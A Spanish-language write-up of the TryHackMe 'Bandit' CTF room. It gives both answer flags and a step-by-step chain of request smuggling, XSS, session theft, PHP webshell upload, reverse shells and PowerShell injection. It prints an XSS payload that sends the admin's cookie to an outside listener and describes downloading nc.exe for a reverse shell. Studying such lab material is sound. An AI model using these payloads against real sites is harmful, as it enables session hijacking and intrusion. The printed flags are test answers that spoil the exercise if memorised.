# Bandit

| **Dificultad** | Hard |
| **Tipo** | CTF |
| **Slug** | `bandit` |
| **Link** | [TryHackMe](https://tryhackme.com/room/bandit) |
| **Sección** | 03 Level Hard |
| **Fuente** | thmrevenant (GitHub) |
| **Componentes** | Apache Traffic Server / HTTP Request Smuggling / XSS / Gobuster / PHP webshell / Burp Suite / PowerShell / SSH / PSSession |
| **Impacto** | Cadena de HTTP Request Smuggling (CL.TE) y XSS contra Apache Traffic Server para robar la sesión del admin, subir un webshell PHP minimizado y escapar de un PowerShell restringido hasta root. |

---

**Contexto:** La sala Bandit cubre HTTP Request Smuggling (Apache Traffic Server), bypass de subida de archivos e inyección de PowerShell. Se registra un túnel SSH, se roba la sesión del administrador que monitorea el sitio mediante smuggling + XSS, se sube un webshell PHP diminuto, y tras pivotar se escapa del entorno restringido de PowerShell para obtener las flags de user y root.

## Solucionario

### Task 1: Bandera de usuario

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the user flag? | `THM{ALL_THIS_ESCAPING_MAKES_ME_TIRED_AM_I_DONE?}` |

### Task 2: Bandera de root

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the root flag? | `THM{FULL_PRIVILEGES_HERE_THE_ESCAPE_IS_DONE}` |

---

**Metodología:**
1. Acceso inicial por SSH a `register@<Target primeros 3 octetos>.250` con la contraseña `register`; se obtiene el hostname `bandit.escape`.
2. Escaneo Nmap completo: puertos `22` (OpenSSH Ubuntu), `80` (Apache Traffic Server 7.1.1), `631` (CUPS 2.4) y `8002` (Apache Hadoop).
3. En `bandit.escape` la caja de búsqueda refleja la entrada; el filtrado de XSS se evade cerrando el atributo con `"` y un `>` (`"><script>alert('1');</script>`). Cada usuario recibe una cookie `PHPSESSID` y la página está siendo "monitoreada".
4. HTTP Request Smuggling en Apache Traffic Server 7.1.1 (CL.TE): se envía de forma rápida una petición que "cuela" el XSS en la sesión del administrador que vigila el sitio.
5. Payload de robo de cookie (URL-encoded) `a"><script>document.write('<img src="http://<IP>:8002/test.gif?cookie=' + document.cookie + '" />');</script>`; tras ~1 minuto cae el `PHPSESSID` del admin en el listener.
6. Gobuster revela `upload.php` (redirige a `login.php`) y el directorio `uploads/`; con la sesión robada se accede al área de subida.
7. File Upload Bypass: un archivo PHP con extensión `.png` se acepta (se guarda con el MD5 del nombre) y cambiando la extensión a `.php` también funciona (Burp Repeater); como hay límite de caracteres se usa el shell PHP más pequeño posible.
8. Reverse shell con `nc` y enumeración del contenedor (`.dockerenv`); en el directorio anterior aparece `auth.php` con credenciales válidas para SSH.
9. SSH como usuario `ubuntu` (miembro de `sudo`) → acceso root; el directorio `.local` de `ubuntu` contiene PowerShell (`pwsh`) y credenciales para una `PSSession`.
10. `/etc/hosts` resuelve al target Windows (`banditcorp`); se establece la `PSSession` y se descubre un entorno de PowerShell restringido.
11. Inyección de PowerShell: `Get-ServicesApplication` usa `Invoke-Expression`, por lo que `-Filter '$(<comando>)'` permite ejecutar código; se descarga `nc.exe` y se lanza una reverse shell → escape completo → flags de user y root.

**Learning chain:** `SSH register → nmap → HTTP Request Smuggling CL.TE → XSS → robar PHPSESSID → upload.php → webshell PHP diminuto → reverse shell → auth.php creds → SSH ubuntu (sudo) → pwsh PSSession → PowerShell restringido → Invoke-Expression injection → nc.exe reverse shell → user flag → root flag`

**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application), T1539 (Steal Web Session Cookie), T1505.003 (Web Shell), T1059 (Command and Scripting Interpreter), T1078 (Valid Accounts), T1068 (Exploitation for Privilege Escalation), T1105 (Ingress Tool Transfer)

**Fuente:** [TryHackMe - Bandit](https://tryhackme.com/room/bandit)